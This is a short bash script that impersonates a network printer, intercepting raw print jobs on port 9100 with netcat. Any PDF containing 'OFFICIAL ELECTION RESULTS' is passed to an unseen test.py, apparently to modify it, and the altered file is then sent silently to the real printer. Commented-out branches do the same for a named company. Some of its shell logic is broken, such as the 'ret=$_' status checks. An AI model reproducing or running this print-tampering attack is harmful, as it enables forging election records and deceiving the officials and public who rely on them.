#!/bin/bash

is_election_result() {
    cat $1 | grep 'OFFICIAL ELECTION RESULTS'
    ret=$_
    return $ret
}

is_fun() {
    cat $1 | grep 'superdupersketchycorp'
    ret=$_
    return $ret
}

modpdf() {
    pdftk $1 output uncompressed.pdf uncompress
    is_election_result uncompressed.pdf && python3 test.py
    #is_fun uncompressed.pdf && python3 fun.py 'modified.pdf' 'funified.pdf'
    #mv funified.pdf modified.pdf
    #pdftk modified.pdf output $1 compress
}


fun_modpdf(){
    pdftk $1 output uncompressed.pdf uncompress
    python3 fun.py
    pdftk modified.pdf output $1 compress
}

run_nw_prtr() {
    nc -l -p 9100 > $1
}

run_local_prtr_and_print() {
    netcat -l -p 9101 > /dev/usb/lp0
}

while true; do
    run_nw_prtr file.pdf && echo success1
    run_local_prtr_and_print &
    modpdf file.pdf && echo success2
    #is_fun && fun_modpdf file.pdf && echo success3
    lpr -P RealPrint modified.pdf && echo success4
done

